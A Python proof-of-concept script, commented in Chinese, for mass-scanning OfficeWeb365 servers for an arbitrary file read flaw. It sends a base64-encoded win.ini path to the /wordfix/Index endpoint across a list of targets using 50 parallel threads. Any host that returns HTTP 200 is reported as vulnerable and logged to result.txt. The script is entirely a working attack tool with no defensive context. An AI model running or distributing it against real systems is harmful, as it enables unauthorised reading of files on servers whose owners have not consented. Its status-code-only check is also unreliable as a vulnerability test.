#导包
import requests,argparse,sys

from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test="""         __  __ _                       _    ____    __ _____ 
        / _|/ _(_)                     | |  |___ \  / /| ____|
   ___ | |_| |_ _  ___ _____      _____| |__  __) |/ /_| |__  
  / _ \|  _|  _| |/ __/ _ \ \ /\ / / _ \ '_ \|__ <| '_ \___ \ 
 | (_) | | | | | | (_|  __/\ V  V /  __/ |_) |__) | (_) |__) |
  \___/|_| |_| |_|\___\___| \_/\_/ \___|_.__/____/ \___/____/ 
                                                              
                                                              

 """
    print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='officeweb365-wordfix-Index-任意文件读取')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(50)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/wordfix/Index?f=YzovV2luZG93cy93aW4uaW5p'
    headers={
       'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
        'Priority':'u=0, i',
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1=requests.get(url=target+payload,headers=headers,verify=False,proxies=proxies)
        if res1.status_code==200:
            print(f"[+]目标存在： {target}")
            with open('result.txt','a') as f:
                f.write(target+'\n')
    except:
        pass




if __name__ == '__main__':
    main()